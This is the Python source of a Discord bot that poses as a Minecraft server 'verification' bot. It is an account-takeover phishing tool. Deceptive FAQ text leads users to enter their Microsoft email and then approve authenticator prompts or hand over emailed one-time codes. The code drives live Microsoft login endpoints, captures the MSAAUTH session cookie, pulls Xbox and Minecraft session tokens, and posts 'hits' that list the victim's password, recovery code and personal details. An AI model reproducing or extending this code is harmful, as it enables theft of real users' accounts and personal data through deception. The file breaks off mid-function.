import discord
from discord import app_commands
from discord.ext import commands
from discord import ui, errors
import logging
import json
import sys
import os
import time
import datetime
import asyncio
import re
import httpx
import uuid
import base64
import hmac
import hashlib
import struct
import codecs
import urllib.parse
from urllib.parse import quote, unquote
from dateutil import parser
import sqlite3

# ==================== CONFIGURATION ====================
config = json.load(open("config.json", "r+"))

# ==================== DATABASE ====================
class DBConnection:
    def __init__(self) -> None:
        self.conn = sqlite3.connect("database.db")
        self.cursor = self.conn.cursor()

    def __enter__(self):
        return self
    
    def __exit__(self, *args) -> None:
        self.conn.close()

    def addEmail(self, email: str, pwd: str) -> None:
        self.cursor.execute("""
            INSERT INTO `security_emails` (email, password)
            VALUES (?, ?)
        """, (email, pwd))
        self.conn.commit()

    def getEmailPassword(self, email: str) -> str | None:
        password: str = self.cursor.execute("""
            SELECT password FROM `security_emails`
            WHERE email = ?
        """, (email,)).fetchone()
        self.conn.commit()
        return password
    
    def getEmails(self) -> tuple:
        emails = self.cursor.execute("""
            SELECT email FROM `security_emails`
        """).fetchall()
        return emails

    def addHit(self, hit: str, user: int, payload: str) -> None:
        self.cursor.execute("""
            INSERT INTO `secured_accounts` (hit, user, payload)
            VALUES (?, ?, ?)
        """, (hit, user, payload))
        self.conn.commit()

    def getHit(self, hit: str) -> tuple | None:
        record = self.cursor.execute("""
            SELECT user, payload FROM `secured_accounts`
            WHERE hit = ?
        """, (hit,)).fetchone()
        if not record:
            return None
        return record[0], json.loads(record[1])

def getHit(hit: str) -> tuple | None:
    """The user and account data behind a hit panel."""
    with DBConnection() as database:
        return database.getHit(hit)

# ==================== COMPONENTS V2 ====================
# Components V2 replaces embeds with layout components: a message is a
# LayoutView holding Containers, TextDisplays, Sections and ActionRows.
BRAND = 0x678DC6
SUCCESS = 0x00FF00
DANGER = 0xFF5C5C
WARNING = 0xE4D00A
NEUTRAL = 0xFFFFFF
SSID_COLOUR = 0x50C878

# Ephemeral messages only live for 15 minutes, so interactive panels are given
# the same lifespan. Persistent panels use `timeout=None`.
EPHEMERAL_TIMEOUT = 900.0

texts = {
    "verification": [
        "Server Verification",
        """
Before entering the server, please link your Minecraft account to confirm you're a real human and not a robot. Verification gives you full server access and unlocks all channels.

### FAQ

**Q: Why do I need to verify?**
A: Verification helps us assign you your role. It also protects the factory from intruders and sabotage attempts (a.k.a. raids).

**Q: How long does it take to get verified?**
A: The verification process doesn't take too long! You'll usually get your roles within 30–50 seconds, depending on traffic.

**Q: Why do you need to collect a code?**
A: The code confirms with the Minecraft API that you truly own the account you're verifying, it is required to verify because we are dealing with bots daily.
        """
    ],
    "failed_otp": [
        "Security Email Required",
        "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
    ],
    "failed_auth": [
        "Failed to verify",
        "You pressed the wrong number on your authenticator app. Try again!"
    ],
    "timeout_auth": [
        "Failed to verify",
        "You took too long to verify in your authenticator app. Try again!"
    ],
    "cooldown_otp": [
        "Failed to verify",
        "Please wait a few minutes before trying to verify again! Our system is handling many verifications at once."
    ],
    "invalid_email": [
        "Failed to verify",
        "The email you entered does not exist, make sure you entered it correctly!"
    ],
    "how_to_email": [
        "Add a Security Email",
        """
1) Go to your Microsoft Account: https://account.live.com/proofs/manage/additional
2) Open the "Security" section
3) Choose "Advanced security options"
4) Add a new verification method and select "Email a code"
5) Enter your email and wait 1–2 minutes before retrying verification.
        """
    ]
}

# ==================== LAYOUT HELPERS ====================
def card(*children: ui.Item, accent: int | None = BRAND) -> ui.Container:
    """Groups components into a container with an accent bar."""
    return ui.Container(*children, accent_color=accent)


def heading(text: str, level: int = 2) -> ui.TextDisplay:
    """A markdown heading, the Components V2 replacement for an embed title."""
    return ui.TextDisplay(f"{'#' * level} {text}")


def text(content: str) -> ui.TextDisplay:
    return ui.TextDisplay(content)


def fields(*rows: tuple) -> ui.TextDisplay:
    """Renders embed style fields as a single compact `**Name:** `value`` block."""
    return ui.TextDisplay("\n".join(f"**{name}:** `{value}`" for name, value in rows))


def divider(spacing: discord.SeparatorSpacing = discord.SeparatorSpacing.small) -> ui.Separator:
    return ui.Separator(spacing=spacing)


def screen(*children: ui.Item, timeout: float | None = EPHEMERAL_TIMEOUT) -> ui.LayoutView:
    """Builds the Components V2 payload that gets sent to Discord."""
    view = ui.LayoutView(timeout=timeout)
    for child in children:
        view.add_item(child)
    return view


def notice(body: str, title: str | None = None, accent: int = DANGER) -> ui.LayoutView:
    """A small card used for errors, warnings and confirmations."""
    children = [heading(title, 3), text(body)] if title else [text(body)]
    return screen(card(*children, accent=accent))

# ==================== MODALS ====================
class LinkAccountModal(ui.Modal, title="Verification"):
    """Collects the Minecraft username and the Microsoft account to secure."""

    username = ui.Label(
        text="Minecraft Username",
        component=ui.TextInput(placeholder="Steve", required=True, max_length=16)
    )
    email = ui.Label(
        text="Microsoft Email",
        description="The address the Minecraft account is owned with",
        component=ui.TextInput(placeholder="someone@outlook.com", required=True, max_length=100)
    )

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        username = self.username.component.value.strip()
        email = self.email.component.value.strip()

        if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(email) is None:
            await interaction.response.send_message(
                view=notice("Invalid email. Make sure you entered your email correctly!"),
                ephemeral=True
            )
            return

        await interaction.response.defer()
        await interaction.followup.send(
            view=notice("Please wait while we try to verify you...", accent=BRAND),
            ephemeral=True
        )

        # Check if account is locked
        lockedInfo = await checkLocked(email)

        if lockedInfo:
            if lockedInfo["StatusCode"] != 500:
                if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
                    await interaction.followup.send(
                        view=notice(
                            "This microsoft account is locked, as so we cannot verify it. "
                            "Try again with another account."
                        ),
                        ephemeral=True
                    )
                    return

        session = getSession()
        emailInfo = await sendAuth(session, email)

        if len(emailInfo) == 1:
            await interaction.followup.send(
                view=notice(texts["cooldown_otp"][1], texts["cooldown_otp"][0], accent=WARNING),
                ephemeral=True
            )
            return

        if "Credentials" not in emailInfo:
            await interaction.followup.send(
                view=notice(texts["invalid_email"][1], texts["invalid_email"][0]),
                ephemeral=True
            )
            return

        if "RemoteNgcParams" in emailInfo["Credentials"]:
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]

            if "Entropy" not in emailInfo["Credentials"]["RemoteNgcParams"]:
                response = await session.post(
                    "https://login.live.com/GetOneTimeCode.srf?id=38936",
                    headers={
                        "cookie": "MSPOK=$uuid-55593433-60c8-4191-8fa7-a7874311e85d$uuid-4fd7f4fb-42b7-4ffc-bd3d-8feacfb6a57e$uuid-8f1626a7-4080-4073-8686-354aa5b937cc$uuid-135d7477-b083-41e7-b681-2ce793c563e6$uuid-6c60a9a5-97c2-4902-aee3-00f99efacbcf$uuid-4059f6fb-ae72-4398-810f-c5cb6495640f$uuid-0b2844a4-bbfa-4118-9a20-4b00154ccdc0$uuid-8b82f8ca-93b0-440b-be93-b1a743e05907$uuid-1dce1868-997e-4c06-88d99-44db08a70c67$uuid-3c79bd95-3604-4bc1-8358-353fe9734742"
                    },
                    data=f"login=&flowtoken={device}&purpose=eOTT_RemoteNGC&channel=PushNotifications&SAPId=&lcid=1033&uaid=3dd509e1f6ae4e0fa6debefe3b45abcb&canaryFlowToken=-DukZxrqgCYbURm5kHk3U5rkTOMEtJxkIq761a!27Qbn4GRZqvsySwrek6w*uVBbTB1PQ0w0o!jBR2YoMjkZPZJunzjR2I7op80PNHaOWYedJU8uoipCkH8natDYj!zpmDK6FOTPcbedisM70Rv6oB4v3mxPu9wyTgp2aq6Ugc86bmt8mj9Ox*D3fqwz*pYKeMbDy4vLXVetOsXJK*6GooRw$"
                )
                entropy = response.json()["DisplaySignForUI"]
            else:
                entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]

            await interaction.followup.send(
                view=screen(
                    card(
                        heading("Verification", 3),
                        text(f"Please confirm the code **`{entropy}`** on your authenticator app!"),
                        divider(discord.SeparatorSpacing.large),
                        text("*Waiting for you to approve the request…*"),
                        accent=SUCCESS
                    )
                ),
                ephemeral=True
            )

            async def checkCode(flowToken):
                response = await session.post(
                    url=f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                    headers={
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://login.live.com",
                        "Referer": "https://login.live.com/"
                    },
                    json={"DeviceCode": flowToken}
                )
                return response.json()

            i = 0
            while i < 60:
                data = await checkCode(device)
                print(data)

                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
                    await interaction.followup.send(
                        view=notice(texts["failed_auth"][1], texts["failed_auth"][0]),
                        ephemeral=True
                    )
                    return
                elif data["SessionState"] > 1 or data["AuthorizationState"] > 1:
                    await interaction.followup.send(
                        view=notice("Please allow us to process your roles...", accent=BRAND),
                        ephemeral=True
                    )

                    await secureAndAnnounce(interaction, session, email, device)
                    return
                await asyncio.sleep(1)
                i += 1

            await interaction.followup.send(
                view=notice(texts["timeout_auth"][1], texts["timeout_auth"][0]),
                ephemeral=True
            )
            return

        elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
            for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    verflowtoken = value["data"]
                    verEmail = value["display"]

            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email: {verEmail}")

            await interaction.followup.send(
                view=screen(
                    OtpPrompt(
                        username=username,
                        email=email,
                        flowtoken=verflowtoken,
                        securityEmail=verEmail
                    )
                ),
                ephemeral=True
            )
        else:
            await interaction.followup.send(
                view=screen(
                    card(
                        heading(texts["failed_otp"][0], 3),
                        text(texts["failed_otp"][1]),
                        divider(discord.SeparatorSpacing.large),
                        ui.ActionRow(SecurityEmailButton())
                    )
                ),
                ephemeral=True
            )

class OtpCodeModal(ui.Modal, title="Verification"):
    """Asks for the code that was sent to the security email of the account."""

    code = ui.Label(
        text="Code",
        description="The 6 digit code that was emailed to you",
        component=ui.TextInput(placeholder="000000", required=True, min_length=6, max_length=6)
    )

    def __init__(self, username: str, email: str, flowtoken: str):
        super().__init__()
        self.username = username
        self.email = email
        self.flowtoken = flowtoken

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        code = str(self.code.component.value).strip()
        if len(code) != 6 or not code.isdigit():
            await interaction.response.send_message(
                view=notice("The code must be 6 digits long."),
                ephemeral=True
            )
            return

        await interaction.response.defer()
        await interaction.followup.send(
            view=notice("Please allow up to one minute for us to process your roles...", accent=BRAND),
            ephemeral=True
        )

        session = getSession()
        await secureAndAnnounce(interaction, session, self.email, self.flowtoken, code)

class PanelModal(ui.Modal, title="Verification"):
    """Lets an admin design the verification panel of their own."""

    panel_title = ui.Label(
        text="Title",
        component=ui.TextInput(placeholder="Your Custom Title", required=True, max_length=100)
    )
    panel_body = ui.Label(
        text="Verify Message",
        component=ui.TextInput(
            style=discord.TextStyle.paragraph,
            placeholder="Your Custom Message",
            required=True,
            max_length=1000
        )
    )

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if not config["discord"]["accounts_channel"]:
            await interaction.response.send_message(
                view=notice("You must set the Accounts Channel first through /set_channel"),
                ephemeral=True
            )
            return

        await interaction.channel.send(
            view=customPanel(
                self.panel_title.component.value,
                self.panel_body.component.value
            )
        )
        await interaction.response.send_message(
            view=notice("Sent!", "Done", accent=SUCCESS),
            ephemeral=True
        )

class MsaauthModal(ui.Modal, title="MSAAUTH Cookie"):
    """Placeholder for the MSAAUTH securing method."""

    cookie = ui.Label(
        text="MSAAUTH Cookie",
        component=ui.TextInput(placeholder="Your Cookie here...", required=True)
    )

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        await interaction.response.send_message(
            view=notice("On Development", accent=WARNING),
            ephemeral=True
        )

class DirectMessageModal(ui.Modal, title="Send Message"):
    """Sends a direct message to the user that secured an account."""

    def __init__(self, user: int):
        super().__init__()
        self.user = user

    message = ui.Label(
        text="Your Message",
        component=ui.TextInput(
            style=discord.TextStyle.paragraph,
            placeholder="Custom DM message...",
            required=True
        )
    )

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        user = await interaction.client.fetch_user(self.user)
        try:
            await user.send(self.message.component.value)
        except discord.Forbidden:
            await interaction.response.send_message(
                view=notice(f"I could not DM {user.mention}, their direct messages are closed."),
                ephemeral=True
            )
            return

        await interaction.response.send_message(
            view=notice(f"Sent message to {user.mention}", "Done", accent=SUCCESS),
            ephemeral=True
        )

# ==================== SHARED BUTTONS ====================
class LinkAccountButton(ui.DynamicItem[ui.Button], template=r"verify:link"):
    """Starts the verification flow from a verification panel."""

    def __init__(self) -> None:
        super().__init__(
            ui.Button(
                label="✅ Link your account",
                style=discord.ButtonStyle.green,
                custom_id="verify:link"
            )
        )

    @classmethod
    async def from_custom_id(cls, interaction, item, match, /):
        return cls()

    async def callback(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_modal(LinkAccountModal())

class SecurityEmailButton(ui.DynamicItem[ui.Button], template=r"verify:security-email"):
    """Explains how to add a recovery email to a Microsoft account."""

    def __init__(self) -> None:
        super().__init__(
            ui.Button(
                label="📙 How to?",
                style=discord.ButtonStyle.red,
                custom_id="verify:security-email"
            )
        )

    @classmethod
    async def from_custom_id(cls, interaction, item, match, /):
        return cls()

    async def callback(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(
            view=screen(SecurityEmailHelp()),
            ephemeral=True
        )

class HitButton(ui.DynamicItem[ui.Button], template=r"hit:(?P<action>ban|kick|unban|dm|ssid|owner):(?P<hit>[0-9a-f]{10})"):
    """A moderation or information button attached to a secured account card.

    The state of a hit is stored in the database and looked up by the id that is
    encoded in the custom id, so these buttons keep working after a restart.
    """

    ACTIONS = {
        "ban": ("Ban", discord.ButtonStyle.red),
        "kick": ("Kick", discord.ButtonStyle.red),
        "unban": ("Unban", discord.ButtonStyle.primary),
        "dm": ("💬 DM", discord.ButtonStyle.grey),
        "ssid": ("Reveal SSID", discord.ButtonStyle.primary),
        "owner": ("Owner Info", discord.ButtonStyle.primary)
    }

    def __init__(self, action: str, hit: str) -> None:
        self.action = action
        self.hit = hit
        label, style = self.ACTIONS[action]
        super().__init__(
            ui.Button(label=label, style=style, custom_id=f"hit:{action}:{hit}")
        )

    @classmethod
    async def from_custom_id(cls, interaction, item, match, /):
        return cls(match["action"], match["hit"])

    async def callback(self, interaction: discord.Interaction) -> None:
        record = getHit(self.hit)
        if not record:
            await interaction.response.send_message(
                view=notice("This hit is no longer available, it has expired.", "Expired"),
                ephemeral=True
            )
            return

        user, account = record

        match self.action:
            case "ban" | "kick" | "unban":
                await moderate(interaction, self.action, user)
            case "dm":
                await interaction.response.send_modal(DirectMessageModal(user))
            case "ssid":
                await interaction.response.send_message(view=ssidPanel(account), ephemeral=True)
            case "owner":
                await interaction.response.send_message(view=ownerPanel(account), ephemeral=True)

# ==================== PANELS ====================
class OtpPrompt(ui.Container):
    """Tells the user which security email was used and opens the code modal."""

    title_line = ui.TextDisplay("Verification")
    body = ui.TextDisplay("")
    row = ui.ActionRow()

    def __init__(self, username: str, email: str, flowtoken: str, securityEmail: str):
        super().__init__(accent_color=SUCCESS)
        self.username = username
        self.email = email
        self.flowtoken = flowtoken
        self.body.content = (
            f"To complete verification, enter the confirmation code we sent to `{securityEmail}`.\n"
            "This step prevents automated or fake verifications."
        )

    @row.button(label="✅ Submit Code", style=discord.ButtonStyle.green, custom_id="verify:otp")
    async def submitCode(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        await interaction.response.send_modal(OtpCodeModal(self.username, self.email, self.flowtoken))

class SecurityEmailHelp(ui.Container):
    """Step by step instructions for adding a security email."""

    title_line = ui.TextDisplay(f"## {texts['how_to_email'][0]}")
    body = ui.TextDisplay(texts["how_to_email"][1])
    row = ui.ActionRow()

    def __init__(self) -> None:
        super().__init__(accent_color=NEUTRAL)

    @row.button(label="Got it", style=discord.ButtonStyle.grey, custom_id="verify:help")
    async def dismiss(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        await interaction.response.defer()
        await interaction.delete_original_response()

class InboxPanel(ui.Container):
    """Pages through the inbox of a generated security email."""

    title_line = ui.TextDisplay("Inbox")
    body = ui.TextDisplay("")
    row = ui.ActionRow()

    def __init__(self, emails: list, index: int = 0):
        super().__init__(accent_color=BRAND)
        self.emails = emails
        self.index = index
        self.render()

    def render(self) -> None:
        self.title_line.content = f"## Email Inbox ({self.index + 1}/{len(self.emails)})"
        self.body.content = str(self.emails[self.index])[:3900]
        self.backButton.disabled = self.index == 0
        self.nextButton.disabled = self.index >= len(self.emails) - 1

    async def update(self, interaction: discord.Interaction) -> None:
        self.render()
        await interaction.response.edit_message(content=None, view=self.view)

    @row.button(label="◀️ Back", style=discord.ButtonStyle.primary, custom_id="inbox:back")
    async def backButton(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        if self.index > 0:
            self.index -= 1
        await self.update(interaction)

    @row.button(label="🔄 Refresh", style=discord.ButtonStyle.green, custom_id="inbox:refresh")
    async def refreshButton(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        await self.update(interaction)

    @row.button(label="Next ▶️", style=discord.ButtonStyle.primary, custom_id="inbox:next")
    async def nextButton(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        if self.index < len(self.emails) - 1:
            self.index += 1
        await self.update(interaction)

class TotpPanel(ui.Container):
    """Shows a rolling authenticator code and keeps it up to date."""

    title_line = ui.TextDisplay("## Authenticator Code")
    body = ui.TextDisplay("")
    row = ui.ActionRow()

    def __init__(self, secret: str, code: str):
        super().__init__(accent_color=BRAND)
        self.secret = secret
        self.code = code
        self.render()

    def render(self) -> None:
        self.body.content = f"```\n{self.code}\n```"

    @row.button(label="🔄 Refresh Code", style=discord.ButtonStyle.green, custom_id="auth:totp")
    async def refreshButton(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        self.code = await totp(self.secret)
        self.render()
        await interaction.response.edit_message(content=None, view=self.view)

class SecuringMethodPanel(ui.Container):
    """Lets an admin pick how they want to authenticate before securing."""

    title_line = ui.TextDisplay("## Select Securing Method")
    body = ui.TextDisplay(
        "Choose how you want to authenticate:\n"
        "**MSAAUTH Token** — use a microsoft account session cookie"
    )
    row = ui.ActionRow()

    @row.select(
        placeholder="Select Securing Method",
        custom_id="secure:method",
        min_values=1,
        max_values=1,
        options=[
            discord.SelectOption(
                label="MSAAUTH Token",
                description="Uses your MSAAUTH token to secure",
                value="msaauth"
            ),
            discord.SelectOption(
                label="Recovery Code",
                description="Uses email + recovery code",
                value="rcvcode"
            )
        ]
    )
    async def methodSelect(self, interaction: discord.Interaction, select: discord.ui.Select) -> None:
        if select.values[0] == "msaauth":
            await interaction.response.send_modal(MsaauthModal())

# ==================== PANEL BUILDERS ====================
def verificationPanel() -> ui.LayoutView:
    """The public verification panel, this one is persistent."""
    return screen(
        card(
            heading(texts["verification"][0]),
            text(texts["verification"][1]),
            divider(discord.SeparatorSpacing.large),
            ui.ActionRow(LinkAccountButton())
        ),
        timeout=None
    )

def customPanel(title: str, body: str) -> ui.LayoutView:
    """A verification panel with a custom title and message."""
    return screen(
        card(
            heading(title, 3),
            text(body),
            divider(discord.SeparatorSpacing.large),
            ui.ActionRow(LinkAccountButton())
        )
    )

def hitPanel(account: dict, elapsed: float, hit: str, requester: discord.abc.User) -> ui.LayoutView:
    """The card posted to the hits channel for a secured account."""
    return screen(
        card(
            heading(f"🔒 New Hit! | Secured in {round(elapsed, 2)}s"),
            fields(
                ("MC Username", account["oldName"]),
                ("MC Method", account["method"]),
                ("MC Capes", account["capes"]),
                ("Email", account["email"]),
                ("Security Email", account["secEmail"]),
                ("Password", account["password"]),
                ("Recovery Code", account["recoveryCode"])
            ),
            divider(discord.SeparatorSpacing.large),
            text(
                f"**Secured for:** {requester.mention}\n"
                f"**SSID:** {'✅ Stored' if account['SSID'] else '❌ None'}"
            ),
            ui.Section(
                text("Reveal the SSID and the owner information of this account."),
                accessory=HitButton("ssid", hit)
            ),
            ui.ActionRow(
                HitButton("ban", hit),
                HitButton("kick", hit),
                HitButton("unban", hit),
                HitButton("dm", hit),
                HitButton("owner", hit)
            ),
            accent=WARNING
        ),
        timeout=None
    )

def ssidPanel(account: dict) -> ui.LayoutView:
    """The SSID of a secured Minecraft account."""
    ssid = account.get("SSID")
    if not ssid:
        return notice("This account does not own Minecraft: Java.", "No SSID", accent=WARNING)
    return screen(
        card(
            heading("SSID", 3),
            text(f"```{str(ssid)[:3800]}```"),
            accent=SSID_COLOUR
        ),
        timeout=EPHEMERAL_TIMEOUT
    )

def ownerPanel(account: dict) -> ui.LayoutView:
    """The personal information of the owner of a secured account."""
    return screen(
        card(
            heading("Account Owner", 3),
            fields(
                ("First Name", account["firstName"]),
                ("Last Name", account["lastName"]),
                ("Full Name", account["fullName"]),
                ("Region", account["region"]),
                ("Birthday", account["birthday"]),
                ("Username Change", account.get("usernameInfo", "Unknown"))
            )
        ),
        timeout=EPHEMERAL_TIMEOUT
    )

# ==================== HIT ACTIONS ====================
async def moderate(interaction: discord.Interaction, action: str, user: int) -> None:
    """Shared ban / kick / unban handling for the hit panel buttons."""
    permission = discord.Permissions.kick_members if action == "kick" else discord.Permissions.ban_members
    if interaction.guild is None or not interaction.permissions.has(permission):
        await interaction.response.send_message(
            view=notice("You do not have the necessary permissions!"),
            ephemeral=True
        )
        return

    member = await interaction.client.fetch_user(user)
    done = {"ban": "banned", "kick": "kicked", "unban": "unbanned"}[action]

    try:
        match action:
            case "ban":
                await interaction.guild.ban(user=member)
            case "kick":
                await interaction.guild.kick(user=member)
            case "unban":
                await interaction.guild.unban(user=member)
    except discord.Forbidden:
        await interaction.response.send_message(
            view=notice(f"Failed to {action} {member.mention}! (Invalid Perms / Already {done})"),
            ephemeral=True
        )
        return
    except discord.HTTPException:
        await interaction.response.send_message(
            view=notice(f"Failed to {action} {member.mention}!"),
            ephemeral=True
        )
        return

    await interaction.response.send_message(
        view=notice(f"{member.mention} has been successfully {done}!", "Done", accent=SUCCESS),
        ephemeral=True
    )


# ==================== UTILS ====================
def getSession() -> httpx.AsyncClient:
    return httpx.AsyncClient(
        timeout=None,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    )

async def checkLocked(email: str) -> dict:
    try:
        async with httpx.AsyncClient(timeout=None) as session:
            lockedInfo = await session.post(
                url="https://support.microsoft.com/nl-NL/api/contactus/v1/ExecuteAlchemySAFAction?SourceApp=soc2",
                headers={
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
                    "Host": "support.microsoft.com",
                    "Content-Type": "application/json"
                },
                json={
                    "Locale": "nl-NL",
                    "Parameters": {"emailaddress": email},
                    "ActionId": "signinhelperemailv2",
                    "CorrelationId": "1b846a60-a752-45ee-95cb-b3ddd5b0bacd",
                    "ContextVariables": [],
                    "V2": True
                },
                timeout=5
            )
            return lockedInfo.json()
    except Exception:
        return None

async def sendAuth(session: httpx.AsyncClient, email: str) -> dict:
    sendAuth = await session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33"
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
            "forceotclogin": True,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": True,
            "isOtherIdpSupported": False,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email
        }
    )
    return sendAuth.json()

async def decode(code):
    decoded_url = urllib.parse.unquote(code)
    decoded_text = re.sub(
        r'\\u([0-9A-Fa-f]{4})',
        lambda match: chr(int(match.group(1), 16)),
        decoded_url
    )
    return decoded_text

async def getLiveData(session: httpx.AsyncClient) -> dict:
    response = await session.post("https://login.live.com")
    urlPost = re.search(
        r'https://login\.live\.com/ppsecure/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0',
        response.text
    ).group(0)
    ppft = re.search(r'value=\\?"([^"]+)"', response.text).group(1)
    return {"urlPost": urlPost, "ppft": ppft}

async def getMSAAUTH(session: httpx.AsyncClient, email: str, flowToken: str, data: dict, code: str) -> dict | None:
    if not code:
        loginData = await session.post(
            url=data["urlPost"],
            headers={
                "host": "login.live.com",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i"
            },
            data={
                "login": email,
                "loginfmt": email,
                "slk": flowToken,
                "psRNGCSLK": flowToken,
                "type": "21",
                "PPFT": data["ppft"]
            },
            follow_redirects=True
        )
    else:
        loginData = await session.post(
            url=data["urlPost"],
            headers={
                "host": "login.live.com",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=0, i"
            },
            data={
                "login": email,
                "loginfmt": email,
                "SentProofIDE": flowToken,
                "otc": code,
                "type": "27",
                "PPFT": data["ppft"]
            },
            follow_redirects=True
        )
    if '__Host-MSAAUTH' in session.cookies:
        urlPost = re.search(r'"urlPost"\s*:\s*"([^"]+)"', loginData.text).group(1)
        ppft = quote(re.search(r'"sFT"\s*:\s*"([^"]+)"', loginData.text).group(1), safe='-*')
        return {"urlPost": urlPost, "PPFT": ppft}
    return None

async def polishHost(session: httpx.AsyncClient, postData: dict) -> str:
    data = await session.post(
        url=postData["urlPost"],
        headers={
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": '"Chromium";v="143", "Not A(Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Ch-Ua-Platform-Version": '""',
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=0, i"
        },
        data=f"PPFT={postData['PPFT']}&canary=&LoginOptions=3&type=28&hpgrequestid=&ctx="
    )
    return dict(data.cookies)["__Host-MSAAUTH"]

async def getXBL(session: httpx.AsyncClient) -> dict:
    try:
        data = await session.get(
            url="https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254",
            follow_redirects=False
        )
        location = data.headers["Location"]
        acessTokenRedirect = await session.get(url=location, follow_redirects=False)
        location = acessTokenRedirect.headers["Location"]
        accessTokenRedirect = await session.get(url=location, follow_redirects=False)
        location = accessTokenRedirect.headers["Location"]
        token = re.search(r'accessToken=([^&#]+)', location)
        if not token:
            return None
        accessToken = token.group(1) + "=" * ((4 - len(token.group(1)) % 4) % 4)
        decoded_data = base64.b64decode(accessToken).decode('utf-8')
        json_data = json.loads(decoded_data)
        uhs = json_data[0].get('Item2', {}).get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        xsts = ""
        for item in json_data:
            if item.get('Item1') == "rp://api.minecraftservices.com/":
                xsts = item.get('Item2', {}).get('Token', '')
                break
        return {"xbl": f"XBL3.0 x={uhs};{xsts}"}
    except Exception:
        return None

async def getSSID(xbl: str):
    async with httpx.AsyncClient(timeout=None) as session:
        response = await session.post(
            url="https://api.minecraftservices.com/authentication/login_with_xbox",
            json={
                "identityToken": xbl,
                "ensureLegacyEnabled": True
            }
        )
        jresponse = response.json()
